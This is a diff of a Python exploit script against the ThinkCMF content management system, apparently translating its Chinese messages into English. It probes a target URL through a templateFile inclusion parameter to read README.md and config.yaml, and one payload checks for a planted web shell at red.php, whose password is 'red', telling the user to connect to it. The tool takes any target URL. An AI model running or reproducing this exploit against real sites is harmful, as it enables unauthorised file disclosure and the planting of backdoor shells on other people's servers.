@@ -18,7 +18,7 @@ def payload_01(url):
                                 headers=headers,
                                 timeout=5)
         if '## README' in response.text:
-            print('[+]存在readme.md: {}?a=display&templateFile=README.md'.format(
+            print('[+]readme.md: {}?a=display&templateFile=README.md'.format(
                 url))
             return 0
         return 1
@@ -32,8 +32,9 @@ def payload_02(url):
                                 headers=headers,
                                 timeout=5)
         if 'name: thinkcmf' in response.text:
-            print('[+]存在config.yaml: {}?a=display&templateFile=config.yaml'.
-                  format(url))
+            print(
+                '[+]config.yaml: {}?a=display&templateFile=config.yaml'.format(
+                    url))
             return 0
         return 1
     except RequestException:
@@ -78,7 +79,9 @@ def payload_04(url):
                                     allow_redirects=False,
                                     timeout=5)
             if 'by:zjun' in response.text:
-                print('[+]请连接shell,密码是red: {}/red.php'.format(url))
+                print(
+                    '[+]Please connect to the shell. The password is red: {}/red.php'
+                    .format(url))
                 return 0
             return 1
         return 1
@@ -94,9 +97,9 @@ if __name__ == '__main__':
 | |_| | | | | | | |   < (__| | | | | |  _|_____|  __/>  <| |_) |
  \__|_| |_|_|_| |_|_|\_\___|_| |_| |_|_|        \___/_/\_\ .__/
                                                          |_|
-                                          by:zjun
+                                           by:zjun
                                         www.zjun.info
-该脚本具有一定误差,请谨慎使用,仅供参考!
+The script has some errors, please use it carefully, for reference only!
 		''')
     parser = argparse.ArgumentParser(description='The exp of thinkcmf')
     parser.add_argument('-u', '--url', required=True, help='target url')
@@ -107,8 +110,10 @@ if __name__ == '__main__':
     payload_03 = payload_03(url)
     payload_04 = payload_04(url)
     if payload_01 and payload_02 and payload_03 and payload_04 == 2:
-        print('[-]连接超时:{}'.format(url))
+        print('[-]connection timed out:{}'.format(url))
     elif payload_01 and payload_02 and payload_03 and payload_04 == 1:
-        print('[-]初步测试暂不存在thinkcmf漏洞: {}'.format(url))
+        print(
+            '[-]There is no thinkcmf vulnerability in the preliminary test: {}'
+            .format(url))
     else:
         print('^ _ ^ enjoy it!')
